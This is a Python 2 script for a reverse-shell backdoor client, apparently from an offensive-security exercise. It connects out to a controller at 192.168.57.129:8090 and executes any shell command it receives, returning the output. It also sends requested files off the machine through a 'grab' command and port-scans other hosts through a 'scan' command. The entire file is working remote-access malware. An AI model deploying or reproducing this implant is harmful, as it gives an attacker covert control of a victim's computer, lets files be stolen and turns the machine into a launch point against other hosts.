import socket                    
import subprocess
import os

def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('END')
        f.close()
        
    else: # the file doesn't exist
        s.send('file not found')

# Code for low level port scanner
def scanner(s,ip,ports):
    scan_result = ''
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # connect_ex returns 0 if the connection is successfull
            output = sock.connect_ex((ip, int(port) ))

            if output == 0:
                scan_result = scan_result + "Port " + port + " is opened\n"
            else:
                scan_result = scan_result + "Port " + port + " is closed or Host unreachable\n"

            sock.close()
            
        except Exception,e:
             pass

    s.send(scan_result)
    
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    s.connect(('192.168.57.129', 8090))                            
 
    while True:                                                 
        command =  s.recv(1024)
        
        if 'close' in command:                 
            s.close()
            break

        elif 'grab' in command: 
            try:
                grab,path = command.split(' ')
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )  
                pass

        # Port scanning
        # syntax : scan 192.168.57.129:22,80
        elif 'scan' in command:
            null, addr = command.split(' ')
            ip,portList = addr.split(':')
            ports = portList.split(',')
            scanner(s,ip,ports)
        
        else:                                                 
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read() ) 

def main ():
    connect()
main()

    
